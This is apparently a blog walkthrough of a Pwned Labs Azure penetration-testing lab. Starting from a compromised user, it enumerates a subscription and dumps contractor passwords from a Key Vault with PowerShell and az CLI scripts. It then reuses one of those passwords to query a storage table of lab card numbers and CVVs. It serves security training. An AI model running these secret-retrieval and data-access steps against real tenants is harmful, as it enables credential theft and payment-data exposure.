---
title: "Unlock Access with Azure Key Vault"
date: 2024-10-01T11:13:09+01:00
description: "Explore how Azure Key Vault securely stores and manages secrets, keys, and certificates, and how misconfigurations can lead to the retrieval of sensitive information"
tags: [Azure, Red Teaming, Entra-ID, Powershell]
categories: [Cloud]
---

**Note : This article was inspired by content from Pwned Labs. Special thanks to Pwned Labs for providing insightful resources and awesome learning experience for learners.**

**Lab Link :** [https://pwnedlabs.io/labs/unlock-access-with-azure-key-vault](https://pwnedlabs.io/labs/unlock-access-with-azure-key-vault)

## **Overview**

After successfully compromising the Azure user account `marcus@megabigtech.com` and gaining access to their cloud environment, Mega Big Tech have asked us to see how far we can penetrate into the cloud environment, and if we can access any confidential data. Specifically they need us to assess the security of resources associated with the Azure Subscription ID "`ceff06cb-e29d-4486-a3ae-eaaec5689f94`".


![](https://i.pinimg.com/originals/d8/82/8d/d8828d2d6254273a617e6337d292303d.gif#center)


## **Setting Up**


Tools needed for this lab :

- [PowerShell](https://learn.microsoft.com/en-us/powershell/scripting/install/installing-powershell) 
- [Azure CLI](https://learn.microsoft.com/en-us/cli/azure/install-azure-cli) 
- [Microsoft Graph PowerShell SDK](https://learn.microsoft.com/en-us/powershell/microsoftgraph/installation?view=graph-powershell-1.0)



We need to enable tab completion in `pwsh` on  Kali for faster command entry and navigation through available cmdlets and parameters.

- Running "`mousepad $profile`" on the command line this should open up the powershell config file located at `/home/sec-fortress/.config/powershell/Microsoft.PowerShell_profile.ps1`


```powershell
Register-ArgumentCompleter -Native -CommandName az -ScriptBlock {
    param($commandName, $wordToComplete, $cursorPosition)
    $completion_file = New-TemporaryFile
    $env:ARGCOMPLETE_USE_TEMPFILES = 1
    $env:_ARGCOMPLETE_STDOUT_FILENAME = $completion_file
    $env:COMP_LINE = $wordToComplete
    $env:COMP_POINT = $cursorPosition
    $env:_ARGCOMPLETE = 1
    $env:_ARGCOMPLETE_SUPPRESS_SPACE = 0
    $env:_ARGCOMPLETE_IFS = "`n"
    $env:_ARGCOMPLETE_SHELL = 'powershell'
    az 2>&1 | Out-Null
    Get-Content $completion_file | Sort-Object | ForEach-Object {
        [System.Management.Automation.CompletionResult]::new($_, $_, "ParameterValue", $_)
    }
    Remove-Item $completion_file, Env:\_ARGCOMPLETE_STDOUT_FILENAME, Env:\ARGCOMPLETE_USE_TEMPFILES, Env:\COMP_LINE, Env:\COMP_POINT, Env:\_ARGCOMPLETE, Env:\_ARGCOMPLETE_SUPPRESS_SPACE, Env:\_ARGCOMPLETE_IFS, Env:\_ARGCOMPLETE_SHELL
}

Set-PSReadlineKeyHandler -Key Tab -Function MenuComplete
```




## **WalkThrough**

For this lab the following authentication details where provided :

```
IAM user : marcus@megabigtech.com
Password : [REDACTED]
Login Portal : https://portal.azure.com/
```


We can go ahead and login as the user `marcus` using the below command


```powershell
az login
# Input Email and Password on the prompted browser
```


![](https://i.imgur.com/3Po6AaW.png)


Then to confirm that that we are in the execution context of the user we logged in as run the following command


```powershell
PS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab> az account show

{
  "environmentName": "AzureCloud",
  "homeTenantId": "2590ccef-687d-493b-ae8d-xxxxxxxxxxxxxxxxxx",
  "id": "ceff06cb-e29d-4486-a3ae-eaaec5689f94",
  "isDefault": true,
  "managedByTenants": [],
  "name": "Microsoft Azure Sponsorship",
  "state": "Enabled",
  "tenantDefaultDomain": "megabigtech.com",
  "tenantDisplayName": "Default Directory",
  "tenantId": "2590ccef-687d-493b-ae8d-xxxxxxxxxxxxxxxxxx",
  "user": {
    "name": "marcus@megabigtech.com",
    "type": "user"
  }
}
```


The next command allows us to get a Microsoft Graph session as current user.



```powershell
Install-Module Microsoft.Graph # Install module
Import-Module Microsoft.Graph.Users # Import module
Connect-MgGraph

Install-Module Az # Install module
Import-Module Az # Import module
Connect-AzAccount 
```


![](https://i.imgur.com/hHdKO9M.png)



> Note:  
> 1. The `Connect-AzAccount` command logs you into your Azure account, allowing you to manage and interact with your Azure resources via PowerShell.
>
> 3. The `Connect-MgGraph` command logs you into Microsoft Graph, enabling you to interact with and manage Microsoft 365 services and data (like users, groups, and mail) via PowerShell.



We can then use the below command to show information about our current logged in user just as the `whoami` command in linux


```powershell
PS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab> az ad signed-in-user show

{
  "@odata.context": "https://graph.microsoft.com/v1.0/$metadata#users/$entity",
  "businessPhones": [],
  "displayName": "Marcus Hutch",
  "givenName": "Marcus",
  "id": "41c178d3-c246-4c00-98f0-8113bd631676",
  "jobTitle": "Flag: xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx",
  "mail": null,
  "mobilePhone": null,
  "officeLocation": null,
  "preferredLanguage": null,
  "surname": "Hutch",
  "userPrincipalName": "marcus@megabigtech.com"
}
```



- it is possible to get the group membership of the user by running the following command.

```powershell
PS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab> Get-MgUserMemberOf -userid "marcus@megabigtech.com" | select * -ExpandProperty additionalProperties | Select-Object {$_.AdditionalProperties["displayName"]}

$_.AdditionalProperties["displayName"]
--------------------------------------
Directory Readers
Default Directory
All Company
```



As shown in the above output every member of the `Directory Readers` group is allowed to enumerate Entra ID. Since we have permission, It is also important to enumerate further permissions to see if this user can access other Azure resources :


```powershell
# Given subscription ID
$CurrentSubscriptionID = "ceff06cb-e29d-4486-a3ae-eaaec5689f94"

# Set output format
$OutputFormat = "table"

# Set the given subscription as the active one
& az account set --subscription $CurrentSubscriptionID

# List resources in the current subscription
& az resource list -o $OutputFormat
```


The below output tells us that the Azure Key Vault named `ext-contractors` contains a **Key Vault** (`Microsoft.KeyVault/vaults`). This makes the resource group highly sensitive because Azure Key Vaults are typically used to store:


- **Secrets**: Sensitive data such as passwords, API keys, tokens, or database connection strings.
- **Encryption Keys**: Used to encrypt/decrypt data, such as files or databases.
- **Certificates**: SSL/TLS certificates or other authentication-related certificates.



![](https://i.imgur.com/PhqYNbX.png)


We can then go ahead and check what's inside the key vault with the below script. Make sure to replace the `$VaultName` and `$SubscriptionID` on your own personal engagement.

```powershell
# Set variables
$VaultName = "ext-contractors"

# Set the current Azure subscription
$SubscriptionID = "ceff06cb-e29d-4486-a3ae-eaaec5689f94"
az account set --subscription $SubscriptionID

# List and store the secrets
$secretsJson = az keyvault secret list --vault-name $VaultName -o json
$secrets = $secretsJson | ConvertFrom-Json

# List and store the keys
$keysJson = az keyvault key list --vault-name $VaultName -o json
$keys = $keysJson | ConvertFrom-Json

# Output the secrets
Write-Host "Secrets in vault $VaultName"
foreach ($secret in $secrets) {
    Write-Host $secret.id
}

# Output the keys
Write-Host "Keys in vault $VaultName"
foreach ($key in $keys) {
    Write-Host $key.id
}
```


The below output indicates that the **`ext-contractors`** vault contains **secrets**, and in addition to secrets, **keys** and **certificates** may also be stored in the same Key Vault. Azure Key Vault is designed to securely store **secrets**, **encryption keys**, and **certificates**, so it’s common to find all three types of data objects within a single vault.


> Also take note that, Contractor and consultant accounts often have high privileges due to their temporary nature, making them prime targets for penetration testers and red teamers.


```powershell
PS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab> ./keyvaultenum.ps1                                                    

Secrets in vault ext-contractors
https://ext-contractors.vault.azure.net/secrets/alissa-suarez
https://ext-contractors.vault.azure.net/secrets/josh-harvey
https://ext-contractors.vault.azure.net/secrets/ryan-garcia
Keys in vault ext-contractors
```


![](https://i.imgur.com/NceHRQA.png)


We then need to see what we have in each of this Key Vault entries, Also make sure to replace the `$VaultName`, `$SecretNames` and `$SubscriptionID` in an engagement to get valid output.

```powershell
# Set variables
$VaultName = "ext-contractors"
$SecretNames = @("alissa-suarez", "josh-harvey", "ryan-garcia")

# Set the current Azure subscription
$SubscriptionID = "ceff06cb-e29d-4486-a3ae-eaaec5689f94"
az account set --subscription $SubscriptionID

# Retrieve and output the secret values
Write-Host "Secret Values from vault $VaultName"
foreach ($SecretName in $SecretNames) {
    $secretValueJson = az keyvault secret show --name $SecretName --vault-name $VaultName -o json
    $secretValue = ($secretValueJson | ConvertFrom-Json).value
    Write-Host "$SecretName - $secretValue"
}
```


As shown below the credentials for the three users where retrieved ;


![](https://i.imgur.com/xMzOeFv.png)



It is also possible to enumerate all of this via the "**Azure Portal**" By clicking "All resources" on the portal or using the search bar with the specified search term.


![](https://i.imgur.com/mmWwR58.png)


Click on the `ext-contractors` resource 

![](https://i.imgur.com/WwVtKqZ.png)

Under **objects** > **Secrets**, you should find all user objects

![](https://i.imgur.com/vxxhK5d.png)


It’s good practice to verify if the retrieved users are still active, enabled, or even exist in Entra ID or that they have the same password set, as password reuse is a very common bad practice.


```powershell
PS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab> az ad user list --query "[?givenName=='Alissa' || givenName=='Josh' || givenName=='Ryan'].{Name:displayName, UPN:userPrincipalName, JobTitle:jobTitle}" -o table
Name                      UPN                              JobTitle
------------------------  -------------------------------  ------------------------------------------
Josh Harvey (Consultant)  ext.josh.harvey@megabigtech.com  Consultant (Customer DB Migration Project)
```


The above result shows that the Josh Harvey contractor account is still available. We can go ahead and enumerate this account further.


```powershell
PS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab> Get-MgUser -UserId ext.josh.harvey@megabigtech.com

DisplayName              Id                                   Mail UserPrincipalName
-----------              --                                   ---- -----------------
Josh Harvey (Consultant) 6470f625-41ce-4233-a621-fad0aa0b7300      ext.josh.harvey@megabigtech.com
```



With the above `Id` value we can query for groups that this user belongs to :


```powershell
PS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab> Get-MgUserMemberOf -userid $userid | select * -ExpandProperty additionalProperties | Select-Object {$_.AdditionalProperties["displayName"]}

$_.AdditionalProperties["displayName"]
--------------------------------------
CUSTOMER-DATABASE-ACCESS
Directory Readers
Default Directory
```


![](https://i.imgur.com/VqRrYbK.png)



We see that the user `Josh` belongs to the `CUSTOMER-DATABASE-ACCESS` group as shown above, we can go ahead and query this group to see what we have :


```powershell
PS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab> Get-MgGroup -Filter "displayName eq 'CUSTOMER-DATABASE-ACCESS'"

DisplayName              Id                                   MailNickname Description                                                                                GroupTypes
-----------              --                                   ------------ -----------                                                                                ----------
CUSTOMER-DATABASE-ACCESS 79b430a5-ea4d-4de6-855b-908bdfb052dc 6e69ec6a-6   Provides full read-only access to the Mega Big Tech customer list and customer information {}
```

From the above output, members of this group can access the Mega Big Tech customer list..., taking our enumeration further, Let's see what permissions are assigned.


![](https://i.imgur.com/j47lk7v.png)


However I noticed that there are not so many permissions in the above output since we are still logged in as user `marcus`. So Log out of the current session using `az logout` and `Disconnect-AzAccount`, then log back in with `az login` and `Connect-AzAccount` to try accessing the **Josh Harvey** account with the Key Vault credentials we got earlier.



```powershell
PS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab> Get-AzRoleAssignment -Scope "/subscriptions/ceff06cb-e29d-4486-a3ae-eaaec5689f94" | Select-Object DisplayName, RoleDefinitionName

DisplayName              RoleDefinitionName
-----------              ------------------
Ian Austin               Key Vault Administrator
Marcus Hutch             Key Vault Reader
Marcus Hutch             Key Vault Secrets User
Josh Harvey (Consultant) Reader
CUSTOMER-DATABASE-ACCESS Customer Database Access
IT-HELPDESK              Reader
Security User            Storage Blob Data Reader
Security User            Reader
Azure Security Insights  Microsoft Sentinel Automation Contributor
c7bf3d89f766471691ccdf29 Log Analytics Contributor
c7bf3d89f766471691ccdf29 Monitoring Contributor
c7bf3d89f766471691ccdf29 Monitoring Contributor
c7bf3d89f766471691ccdf29 Log Analytics Contributor
014b118fb59f4ef59faa8c63 Monitoring Contributor
014b118fb59f4ef59faa8c63 Log Analytics Contributor
014b118fb59f4ef59faa8c63 Monitoring Contributor
014b118fb59f4ef59faa8c63 Log Analytics Contributor
f2dde2b466f240afa614abbc Log Analytics Contributor
f2dde2b466f240afa614abbc Monitoring Contributor
b047e83f402747fd8797e1ff Monitoring Contributor
b047e83f402747fd8797e1ff Log Analytics Contributor
0f7ef2ab65244e72925a57e4 Monitoring Contributor
0f7ef2ab65244e72925a57e4 Monitoring Contributor
0f7ef2ab65244e72925a57e4 Log Analytics Contributor
0f7ef2ab65244e72925a57e4 Log Analytics Contributor
f41ed7dd9122452585bcc1ff Monitoring Contributor
f41ed7dd9122452585bcc1ff Log Analytics Contributor
1ae7323ccead497685d1c18a Log Analytics Contributor
1ae7323ccead497685d1c18a Monitoring Contributor
57d7395f82fe4a2593d003b4 Monitoring Contributor
57d7395f82fe4a2593d003b4 Log Analytics Contributor
57d7395f82fe4a2593d003b4 Log Analytics Contributor
57d7395f82fe4a2593d003b4 Monitoring Contributor
9f9dcd98a3a74c7a9b2abace Monitoring Contributor
9f9dcd98a3a74c7a9b2abace Log Analytics Contributor
Clara Miller             Reader
dbuser                   Reader
```


According to the above output the user **Josh Harvey** has been assigned the `Reader` role. The Reader role in Azure grants read-only access to resources but does not allow modification or access to sensitive data like Key Vault contents or databases.


We also see that `CUSTOMER-DATABASE-ACCESS` group has been assigned the `Customer Database Access` role so let enumerate that.


```powershell
az role definition list --custom-role-only true --query "[?roleName=='Customer Database Access']" -o json
```


![](https://i.imgur.com/8cwsJiC.png)


> The above output shows that the group gives members the ability to list storage tables and their values! The Azure Storage Tables are a NoSQL data store for large, structured, non-relational data, part of Azure Storage services alongside Blob, File, and Queue Storage."


We then start by listing the storage accounts in the current Azure subscription in plain text format (TSV) with the below command.

```powershell
PS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab> az storage account list --query "[].name" -o tsv

custdatabase
mbtwebsite
securityconfigs
```



Then we can Issue the following command below to see if any storage tables exist in any of this storage accounts


```powershell
az storage table list --account-name <storage_account> --output table --auth-mode login
```

![](https://i.imgur.com/XW1b2zw.png)


According to the above output only the `custdatabase` storage account has a storage table named `customers` , We can then go ahead and query this storage table leading to the disclosure of sensitive information such as payment data.


```powershell
PS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab> az storage entity query --table-name customers --account-name custdatabase --output table --auth-mode login
PartitionKey    RowKey    Card_expiry    Card_number       Customer_id                           Customer_name                           Cvv
--------------  --------  -------------  ----------------  ------------------------------------  --------------------------------------  -----
1               1         10/30          5425233430109903  07244ad0-c228-43d8-a48e-1846796aa6ad  SecureBank Holdings                     543
1               10        01/30          4347866885036101  cba21bec-7e8d-4394-a145-ea7f6131a998  InnoVenture                             781
1               2         09/29          4012000033330026  66d7a744-5eb6-4b1b-9e70-a36824366534  NeuraHealth                             452
1               3         05/31          4657490028942036  6a88c0ff-b79c-4842-92f1-f25d53c5cbe4  DreamScreen Entertainment               683
1               4         01/29          4657493919180161  14fb331d-a82e-41f8-8f20-d630f312dd3e  InfiNet Solutions                       855
1               5         08/29          4657490203402673  cdf53341-b806-4f69-a1e2-7b632b1d405d  Skyward Aerospace                       344
1               6         12/30          4594045518310163  c6e6418b-fc4e-4f7b-a463-1a3bc6551cd3  Quasar Analytics Inc                    145
1               7         02/29          4594055970518286  fc4f9042-5b94-4a79-b18a-40fa621fe2e1  DataGuard Inc                           243
1               8         06/30          4698558990398121  07a2cfae-16de-41a9-af51-b9cd9f077800  Huge Logistics                          546
1               9         03/30          4698559508013566  512df22d-815f-4f98-92af-a615a92ea39d  SmartMove Robotics                      992
1               99                                                                               Flag: xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
```

Have fun ⋆.˚ ᡣ𐭩 .𖥔˚

## **Key Takeaways**


- Azure Key Vault is a critical service for securely storing and managing sensitive information like secrets, keys, and certificates.

- By centralizing secrets in the Key Vault, you reduce the risk of exposure and ensure tighter control over access.
Role-based access control (RBAC) and Access Policies help limit access to only authorized users and services.

- Regular auditing and rotating of secrets enhances security, minimizing potential breaches.

- Implementing the Principle of Least Privilege ensures that only necessary permissions are granted, reducing attack surfaces.